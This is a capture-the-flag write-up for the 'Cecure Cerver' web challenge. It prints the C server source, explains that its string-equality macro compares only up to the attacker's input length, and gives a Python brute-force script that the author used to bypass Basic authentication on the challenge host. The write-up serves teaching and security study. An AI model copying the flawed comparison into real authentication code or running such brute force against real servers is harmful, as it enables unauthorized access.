### Cecure Cerver | 13 Solves 988 Points
```
Many Cecure web Cervers are written in C

Author: jro
```

This challenge was solved by `elijah5399`. This writeup is based upon his solve script.

We are given a hefty distribution file which contains a `.c` file of the server code used to launch the web application.
```c
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>


#define STRING_EQUALS(s1, s2) (!strncmp(s1, s2, strlen(s1)))

void setup(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void send_response(int code, char *msg){
    char *status_msg = "Unknown";
    char *headers = "";
    if(code == 400){
        status_msg = "Bad Request";
    } else if (code == 200)
    {
        status_msg = "OK";
    } else if (code == 401)
    {
        status_msg = "Unauthorized";
        headers = "WWW-Authenticate: Basic realm=\"cerver\"\r\n";
    }
    
    printf("HTTP/1.1 %d %s\r\n", code, status_msg);
    printf("%s", headers);
    puts("Content-Type: text/plain\r");
    printf("Content-Length: %d\r\n", strlen(msg));
    puts("\r");
    printf("%s", msg);
    exit(0);
}


// Base64 character set
const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// https://github.com/realapire/base64-encode-decode/blob/master/base64.c
// Function to decode a Base64 encoded string into binary data
unsigned char *base64_decode(const char *input, size_t *output_length) {
    size_t input_length = strlen(input) - 2;
    if (input_length % 4 != 0) {
        return NULL; // Invalid Base64 input length
    }

    // Calculate the expected output length
    *output_length = (3 * input_length) / 4;
    if (input[input_length - 1] == '=') {
        (*output_length)--;
    }
    if (input[input_length - 2] == '=') {
        (*output_length)--;
    }

    // Allocate memory for the decoded data
    unsigned char *decoded_data = (unsigned char *)malloc(*output_length);
    if (decoded_data == NULL) {
        return NULL; // Memory allocation failed
    }

    // Initialize variables for decoding process
    size_t j = 0;
    __uint32_t sextet_bits = 0;
    int sextet_count = 0;

    // Loop through the Base64 input and decode it
    for (size_t i = 0; i < input_length; i++) {
        // Convert Base64 character to a 6-bit value
        __uint32_t base64_value = 0;
        if (input[i] == '=') {
            base64_value = 0;
        } else {
            const char *char_pointer = strchr(base64_chars, input[i]);
            if (char_pointer == NULL) {
                free(decoded_data);
                return NULL; // Invalid Base64 character
            }
            base64_value = char_pointer - base64_chars;
        }

        // Combine 6-bit values into a 24-bit sextet
        sextet_bits = (sextet_bits << 6) | base64_value;
        sextet_count++;

        // When a sextet is complete, decode it into three bytes
        if (sextet_count == 4) {
            decoded_data[j++] = (sextet_bits >> 16) & 0xFF;
            decoded_data[j++] = (sextet_bits >> 8) & 0xFF;
            decoded_data[j++] = sextet_bits & 0xFF;
            sextet_bits = 0;
            sextet_count = 0;
        }
    }

    return decoded_data;
}


char *read_file(char *fname){
    int fd = open(fname, O_RDONLY);
    char *data = calloc(1, 0x20);
    read(fd, data, 0x20);
    close(fd);
    return data;
}


int main(){
    char line[0x100];
    fgets(line, sizeof(line), stdin);

    char *method = strtok(line, " ");

    if(!STRING_EQUALS(method, "GET")){
        send_response(400, "Only GET request allowed");
    }

    // Headers
    while(1) {
        fgets(line, sizeof(line), stdin);
        if(STRING_EQUALS(line, "\r\n")){
            break;
        }
        char *header_name = strtok(line, ":");
        if(STRING_EQUALS(header_name, "Authorization")){
            char *val = line + strlen(header_name) + 2;
            if(!STRING_EQUALS("Basic ", val)){
                send_response(401, "Basic authentication required!");
            }
            char *base64ed = line + strlen("Authorization: Basic ");
            size_t len;
            char *decoded = base64_decode(base64ed, &len);

            char *correct_username = read_file("./uname.txt");
            char *correct_password = read_file("./pwd.txt");
            char *flag = read_file("./flag.txt");
            char* username = strtok(decoded, ":");
            if(username && strlen(username) && STRING_EQUALS(username, correct_username)){
                char *password = strtok(NULL, ":");
                if(password && strlen(password) && STRING_EQUALS(password, correct_password)){
                    send_response(200, flag);
                }
            }
            send_response(401, "Invalid credentials");
        }
    }
    send_response(401, "Authentication required");
}
```

When we connect to the web application, we find ourselves in `main()` which automatically launches a pop-up telling us to insert credentials. We enter a username, password pair which is then checked by the server in `uname.txt` and `pwd.txt`, both of which we aren't able to access or know of. (we can't LFI into them to begin with by calling `http://challs.nusgreyhats.org:32905/uname.txt` for instance, as we still need to authenticate ourselves first). Regardless, once we pass authentication, `send_response(200, flag)` is called thus giving us the flag.

The vulnerability for this challenge lies in `STRING_EQUALS()`
```c
#define STRING_EQUALS(s1, s2) (!strncmp(s1, s2, strlen(s1)))
```
It calls `strncmp()` which checks up to the length of the first parameter. This very first parameter, also happens to be our input `username` and `password`.

Thus, suppose we know the first byte of `uname.txt` and `password.txt`. By inputting the first byte, `STRING_EQUALS()` will be called on our input which will only check up till the first byte. In such a case, we would pass the authentication check even though we don't know what the rest of the username or password is!

This makes way for a 2^16 brute force of possible byte combinations. We narrow it down to printable characters and manage to find a valid pair;

```py
import requests
import base64
import string
from tqdm import tqdm

# # brute force code
# l = [chr(_) for _ in range(0x20, 0x7f)]
# for i in tqdm(l):
#     for j in l:
#         b = f"{i}:{j}".encode()
#         pl = f"Basic {base64.b64encode(b).decode()}"
#         r = requests.get('http://challs.nusgreyhats.org:32905/',headers={'Authorization': pl})
#         if r.status_code == 200:
#             print(f"found b64 key: {b}")

i = "6"
j = "b"
b = f"{i}:{j}".encode()
pl = f"Basic {base64.b64encode(b).decode()}"
r = requests.get('http://challs.nusgreyhats.org:32905/',headers={'Authorization': pl})
print(r.text)
```

```
grey{3xpl0171n6_l061c_bu65}
```